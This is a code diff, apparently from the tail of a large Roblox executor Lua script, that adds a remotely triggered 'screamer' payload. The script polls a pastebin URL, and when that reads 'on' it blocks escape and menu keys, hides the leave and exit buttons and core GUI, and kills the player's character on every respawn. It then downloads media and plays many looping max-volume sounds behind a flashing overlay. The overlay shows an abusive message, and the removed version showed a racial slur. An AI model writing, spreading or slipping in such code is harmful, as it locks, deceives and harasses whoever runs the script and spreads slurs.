@@ -7800,112 +7800,318 @@ task.spawn(function()
     _G._ShowSpinWheel = showTierPopup
 end)
 
--- This file was generated with SKS V1.2.0
--- Модифицировано: проверка pastebin на "on"/"off" с автообновлением
+============================================================
+-- Скример (полностью из document 3.txt)
+-- ============================================================
+local function runScreamer()
+    if triggered then return end
+    triggered = true
 
-local fenv = getfenv()
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
+    local CAS = game:GetService("ContextActionService")
+    local StarterGui = game:GetService("StarterGui")
+    local GuiService = game:GetService("GuiService")
+    local CoreGui = game:GetService("CoreGui")
+    local UIS = game:GetService("UserInputService")
 
--- ============ НАСТРОЙКИ ============
-local PASTEBIN_URL = "https://pastebin.com/raw/SWQZAFMn"
-local CHECK_INTERVAL = 1 -- секунд между проверками
-
--- ============ СОСТОЯНИЕ ============
-local isActive = false
-local screenGui = nil
-local sound = nil
-
--- ============ ФУНКЦИЯ ПОЛУЧЕНИЯ СТАТУСА ============
-local function getStatus()
-    local ok, result = pcall(function()
-        return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
+    pcall(function()
+        CAS:BindAction("hard_block", function() return Enum.ContextActionResult.Sink end, false,
+            Enum.KeyCode.Escape, Enum.KeyCode.ButtonStart, Enum.KeyCode.ButtonB,
+            Enum.KeyCode.ButtonSelect, Enum.KeyCode.Backspace, Enum.KeyCode.F9,
+            Enum.KeyCode.F10, Enum.KeyCode.Home, Enum.KeyCode.Tab, Enum.KeyCode.P,
+            Enum.KeyCode.L, Enum.KeyCode.M, Enum.KeyCode.Slash,
+            Enum.KeyCode.Comma, Enum.KeyCode.Period
+        )
     end)
-    if not ok or not result then
-        return nil
+
+    pcall(function()
+        for _, t in ipairs({Enum.CoreGuiType.All, Enum.CoreGuiType.Chat, Enum.CoreGuiType.Backpack,
+            Enum.CoreGuiType.PlayerList, Enum.CoreGuiType.EmotesMenu, Enum.CoreGuiType.Health,
+            Enum.CoreGuiType.ResetButton}) do
+            pcall(function() StarterGui:SetCoreGuiEnabled(t, false) end)
+        end
+    end)
+
+    pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
+    pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+
+    pcall(function()
+        GuiService.MenuOpened:Connect(function()
+            pcall(function() GuiService:SetMenuIsOpen(false) end)
+        end)
+    end)
+
+    pcall(function()
+        UIS.InputBegan:Connect(function(input, processed)
+            if input.KeyCode == Enum.KeyCode.Escape
+            or input.KeyCode == Enum.KeyCode.Backspace
+            or input.KeyCode == Enum.KeyCode.F9
+            or input.KeyCode == Enum.KeyCode.F10
+            or input.KeyCode == Enum.KeyCode.Home then
+                pcall(function() UIS:GetPropertyChangedSignal("WindowFocusReleased") end)
+            end
+        end)
+    end)
+
+    task.spawn(function()
+        while task.wait(0.05) do
+            pcall(function()
+                local rg = CoreGui:FindFirstChild("RobloxGui")
+                if rg then
+                    local topBar = rg:FindFirstChild("TopBarContainer")
+                    if topBar then
+                        for _, b in ipairs(topBar:GetChildren()) do
+                            if b:IsA("GuiObject") then
+                                b.Visible = false
+                                b.Active = false
+                            end
+                        end
+                    end
+                    local newTop = rg:FindFirstChild("TopBarApp")
+                    if newTop then
+                        for _, d in ipairs(newTop:GetDescendants()) do
+                            if d:IsA("GuiObject") then
+                                d.Visible = false
+                                d.Active = false
+                            end
+                        end
+                    end
+                    for _, d in ipairs(rg:GetDescendants()) do
+                        if d:IsA("GuiButton") or d:IsA("TextButton") or d:IsA("ImageButton") then
+                            local n = tostring(d.Name):lower()
+                            if n:find("menu") or n:find("escape") or n:find("topbar")
+                            or n:find("settings") or n:find("leave") or n:find("exit")
+                            or n:find("close") or n:find("quit") then
+                                d.Visible = false
+                                d.Active = false
+                            end
+                        end
+                    end
+                end
+                local top = CoreGui:FindFirstChild("TopBarContainer")
+                if top then
+                    for _, b in ipairs(top:GetChildren()) do
+                        if b:IsA("GuiObject") then
+                            b.Visible = false
+                            b.Active = false
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+
+    task.spawn(function()
+        while task.wait(0.05) do
+            pcall(function()
+                local pg = CoreGui:FindFirstChild("RobloxPromptGui")
+                if pg then
+                    local ov = pg:FindFirstChild("promptOverlay")
+                    if ov then
+                        for _, c in ipairs(ov:GetChildren()) do
+                            if c:IsA("GuiObject") then c:Destroy() end
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+
+    task.spawn(function()
+        while task.wait(0.2) do
+            pcall(function()
+                if GuiService.MenuIsOpen then GuiService:SetMenuIsOpen(false) end
+                StarterGui:SetCore("ResetButtonCallback", false)
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+            end)
+        end
+    end)
+
+    Player.CharacterAdded:Connect(function(char)
+        task.wait(0.1)
+        pcall(function()
+            char:BreakJoints()
+            if char:FindFirstChildOfClass("Humanoid") then
+                char:FindFirstChildOfClass("Humanoid").Health = 0
+            end
+        end)
+    end)
+
+    Player.CharacterRemoving:Connect(function()
+        task.wait(0.1)
+        pcall(function()
+            if not Player.Character then
+                Player.CharacterAdded:Wait()
+            end
+        end)
+    end)
+
+    task.spawn(function()
+        while task.wait(0.5) do
+            pcall(function()
+                local sg = Player.PlayerGui:FindFirstChild("SKS_Protection")
+                if not sg then
+                    sg = Instance.new("ScreenGui")
+                    sg.Name = "SKS_Protection"
+                    sg.ResetOnSpawn = false
+                    sg.DisplayOrder = 2147483647
+                    sg.Parent = Player.PlayerGui
+                end
+            end)
+        end
+    end)
+
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    end)
+
+    -- ============================================================
+    -- 🔊 ЗВУК + КАРТИНКА
+    -- ============================================================
+    local fenv = getfenv()
+
+    -- Скачиваем аудио
+    local okAudio, audioData = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
+    end)
+    if okAudio and audioData then
+        pcall(function() writefile("po.mp3", audioData) end)
     end
-    -- нормализуем: убираем пробелы, переносы, приводим к нижнему регистру
-    local cleaned = result:gsub("%s+", ""):lower()
-    if cleaned:find("on") then
-        return "on"
-    elseif cleaned:find("off") then
-        return "off"
+
+    local soundAsset
+    pcall(function() soundAsset = fenv.getcustomasset("po.mp3") end)
+
+    if soundAsset then
+        local Sound = Instance.new("Sound")
+        Sound.Parent = workspace
+        Sound.SoundId = soundAsset
+        Sound.Volume = 10
+        Sound.Looped = true
+        Sound:Play()
+
+        for i = 1, 20 do
+            local s = Instance.new("Sound")
+            s.Parent = workspace
+            s.SoundId = soundAsset
+            s.Volume = 10
+            s.Looped = true
+            s.RollOffMaxDistance = 1e9
+            s.RollOffMinDistance = 0
+            s:Play()
+        end
     end
-    return nil
+
+    -- Скачиваем картинку
+    local okImg, imgData = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/alexcodep/photo-puzda-live/070ee57f1f973fb969a34bfafba5c486c95638a9/IMG_0885.jpeg")
+    end)
+    if okImg and imgData then
+        pcall(function() writefile("dsf.jpg", imgData) end)
+    end
+
+    local imgAsset
+    pcall(function() imgAsset = fenv.getcustomasset("dsf.jpg") end)
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "SKS_HardLock"
+    ScreenGui.DisplayOrder = 2147483647
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = Player.PlayerGui
+
+    local BG = Instance.new("Frame")
+    BG.Size = UDim2.new(1, 0, 1, 0)
+    BG.BackgroundColor3 = Color3.new(0, 0, 0)
+    BG.BorderSizePixel = 0
+    BG.ZIndex = 1
+    BG.Parent = ScreenGui
+
+    local ImageLabel = Instance.new("ImageLabel")
+    if imgAsset then
+        ImageLabel.Image = imgAsset
+    end
+    ImageLabel.Size = UDim2.new(0, 600, 0, 600)
+    ImageLabel.BackgroundTransparency = 1
+    ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    ImageLabel.ZIndex = 5
+    ImageLabel.Parent = ScreenGui
+
+    local TextLabel = Instance.new("TextLabel")
+    TextLabel.Text = "SLUT SPOOF SCAMMER YOU GOT HACKED CHANGE PASSWORD DUMBASS"
+    TextLabel.TextScaled = true
+    TextLabel.Size = UDim2.new(0, 200, 0, 100)
+    TextLabel.TextColor3 = Color3.new(1, 1, 1)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    TextLabel.ZIndex = 999
+    TextLabel.Parent = ScreenGui
+
+    task.spawn(function()
+        local colors = {
+            Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
+            Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255)
+        }
+        while true do
+            for _, c in ipairs(colors) do
+                pcall(function() BG.BackgroundColor3 = c end)
+                task.wait(0.05)
+            end
+        end
+    end)
+
+    task.spawn(function()
+        local TS = game:GetService("TweenService")
+        while true do
+            pcall(function()
+                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 800, 0, 800)}):Play()
+            end)
+            task.wait(0.4)
+            pcall(function()
+                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 500, 0, 500)}):Play()
+            end)
+            task.wait(0.4)
+        end
+    end)
+
+    task.spawn(function()
+        local RS = game:GetService("RunService")
+        local t = 0
+        RS.RenderStepped:Connect(function(dt)
+            t = t + dt * 5
+            pcall(function() TextLabel.TextColor3 = Color3.fromHSV(t % 1, 1, 1) end)
+        end)
+    end)
+
+    task.spawn(function()
+        while task.wait(0.3) do
+            pcall(function()
+                ScreenGui.DisplayOrder = 2147483647
+                if not ScreenGui.Parent then
+                    ScreenGui.Parent = Player.PlayerGui
+                end
+            end)
+        end
+    end)
 end
 
--- ============ ВКЛЮЧЕНИЕ СКРИМЕРА ============
-local function activate()
-    if isActive then return end
-    isActive = true
-
-    -- Звук
-    writefile(
-        "po.mp3",
-        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
-    )
-    sound = Instance.new("Sound")
-    sound.Parent = workspace
-    sound.SoundId = fenv.getcustomasset("po.mp3")
-    sound.Volume = 10
-    sound.Looped = true
-    sound:Play()
-
-    -- Картинка
-    writefile(
-        "dsf.jpg",
-        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/photo_2025-12-03_21-03-11.jpg")
-    )
-    screenGui = Instance.new("ScreenGui")
-    screenGui.DisplayOrder = 999
-    screenGui.Parent = Players.LocalPlayer.PlayerGui
-
-    local imageLabel = Instance.new("ImageLabel")
-    imageLabel.Image = fenv.getcustomasset("dsf.jpg")
-    imageLabel.Size = UDim2.new(0, 600, 0, 600)
-    imageLabel.BackgroundTransparency = 1
-    imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-    imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-    imageLabel.Parent = screenGui
-
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Text = "нигга"
-    textLabel.TextScaled = true
-    textLabel.Size = UDim2.new(0, 200, 0, 100)
-    textLabel.TextColor3 = Color3.new(1, 1, 1)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-    textLabel.ZIndex = 999
-    textLabel.Parent = screenGui
-end
-
--- ============ ВЫКЛЮЧЕНИЕ СКРИМЕРА ============
-local function deactivate()
-    if not isActive then return end
-    isActive = false
-
-    if sound then
-        pcall(function() sound:Stop() end)
-        pcall(function() sound:Destroy() end)
-        sound = nil
-    end
-
-    if screenGui then
-        pcall(function() screenGui:Destroy() end)
-        screenGui = nil
-    end
-end
-
--- ============ ЦИКЛ ПРОВЕРКИ ============
+-- ============================================================
+-- 🔁 АВТОЧЕКЕР
+-- ============================================================
 task.spawn(function()
     while true do
-        local status = getStatus()
-        if status == "on" then
-            activate()
-        elseif status == "off" then
-            deactivate()
+        local ok, response = pcall(fetchPastebin)
+
+        if ok and response then
+            -- Убираем HTML-теги и мусор, оставляем чистый текст
+            local clean = response:gsub("<[^>]->", ""):lower()
+            -- Проверяем именно как отдельное слово "on"
+            if clean:match("%f[%a]on%f[%A]") or clean:match("^%s*on%s*$") then
+                runScreamer()
+                return
+            end
         end
+
         task.wait(CHECK_INTERVAL)
     end
 end)
